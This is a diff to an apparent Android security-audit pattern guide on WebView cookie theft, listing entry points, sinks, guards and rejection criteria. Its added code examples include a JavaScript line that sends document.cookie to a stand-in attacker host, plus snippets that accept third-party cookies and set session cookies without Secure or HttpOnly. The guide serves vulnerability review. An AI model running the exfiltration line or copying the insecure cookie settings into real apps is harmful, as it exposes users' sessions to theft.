@@ -1,51 +1,49 @@
 # Pattern: WebView Cookie Theft
 
-## When To Use
+## Match
 
-Use this reference when attacker-controlled WebView content can receive, set, sync, or exfiltrate authentication cookies, session headers, tokens, or trusted account state.
+`CookieManager` or WebView persistence lets an attacker-influenced request reach a same-origin endpoint carrying the user's cookies. Key primitives:
+1. **CookieManager shared between WebView and `HttpURLConnection`/`OkHttp`** — non-obvious. A cookie set by the WebView on the app's API domain can be read by the network client. Attacker script on same domain fetches `/api/me`.
+2. `setAcceptThirdPartyCookies(true)` — third-party script sets cookies surviving the WebView session.
+3. `removeAllCookies(null)` never called after sensitive nav — cookies persist across runs.
+4. WebView reachable to attacker host carrying same-domain cookies; `javascript:` URL exfiltrates `document.cookie`.
 
-## Core Concept
+## Analyze
 
-Untrusted content enters a WebView that shares sensitive cookie/session state with trusted origins or native bridge workflows.
+- entry: `CookieManager.setAcceptCookie`, `setAcceptThirdPartyCookies`, `CookieSyncManager.createInstance` (deprecated), `setCookie(url, value)`, WebView reaching an attacker host, `javascript:` URL in WebView, redirect to a non-HTTPS host
+- control: host, scheme, cookie `Domain` / `Path` / `Secure` / `HttpOnly` / `SameSite`, WebView vs. network client sharing, `CookieManager.removeAllCookies` timing
+- sink: `CookieManager.getCookie(url)` returning the user's session cookie, `HttpURLConnection` reading the shared `CookieManager` for the same domain, exfiltration to `http://attacker.com`, replay of stolen session cookie
+- guard: `setAcceptThirdPartyCookies(false)`, never load `javascript:` URL, use only `https://` for cookie-bearing domains, prefer `OkHttp` with own `CookieJar` over shared WebView `CookieManager`, `setBlockNetworkLoads(true)` for non-network WebViews, clear cookies on logout
+- impact: session cookie theft via shared CookieManager, account takeover, cross-app cookie theft
 
-**Sources**
-- attacker-controlled URL/redirect/HTML; weak domain matching, cookie injection, third-party cookie policy, shared CookieManager state; deep link or scan result controlling authenticated WebView navigation.
+## Reject
 
-**Sinks**
-- `CookieManager.getCookie`, `setCookie`, third-party cookie access; authenticated WebView page load on attacker-controlled domain; bridge/native action using session-bound WebView state.
+Reject when the network client uses its own `CookieJar` (not shared WebView `CookieManager`), the WebView loads only trusted origin, and no `javascript:` URL is loaded.
 
-## Guards & Rejection
+## Codes
 
-Safe when: attacker content never shares the authenticated WebView profile, cookies are scoped to exact trusted domains, third-party cookies are disabled where needed, and native actions do not trust web session state alone.
-
-Reject when: only public cookies are involved, attacker cannot control the loaded origin, session cookies are not sent or readable, or no authenticated state/action is reachable.
-
-## Rating
-
-- HIGH: no-interaction credential/session theft or authenticated native action.
-- MEDIUM: session abuse requiring stronger interaction or bounded scope.
-- LOW: low-value cookie metadata only.
-- IGNORED: cookie APIs exist but no attacker-controlled origin receives sensitive state.
-
-## Trace Commands
-
-```bash
-decx code xref-method "android.webkit.CookieManager.getCookie(java.lang.String):java.lang.String" -P <port>
-decx code method-context "<webviewNavigationMethod>" -P <port>
+```java
+// WebView loads an attacker host
+webView.loadUrl("http://attacker.com/exploit.html");
 ```
 
-## Example Shapes
-
-Suspicious:
-
-```text
-authentication cookies shared across WebView -> attacker-controlled page loaded in same WebView instance -> cookies sent to attacker domain
+```javascript
+// javascript: URL exfiltrates cookies from a vulnerable page
+document.location = "http://attacker.com/?c=" + document.cookie;
 ```
 
-Safe:
-
-```text
-WebView uses isolated session or separate CookieManager -> no shared auth cookies with external content
+```java
+// accept third-party cookies — third-party script can set/override the session cookie
+CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
 ```
 
-Report guidance -- Use: "Attacker-controlled WebView content can access or receive authentication cookies from a trusted session context." Avoid: "WebView has cookies enabled" without proving authentication cookies reach attacker-controlled content.
+```java
+// session cookie missing Secure + HttpOnly
+String cookie = "session=" + sessionToken + "; path=/; domain=victim.com";
+CookieManager.getInstance().setCookie("http://victim.com", cookie);
+```
+
+```java
+// WebView and network client share the same CookieManager
+okHttpClient.cookieJar(new WebViewCookieJar(webView));
+```
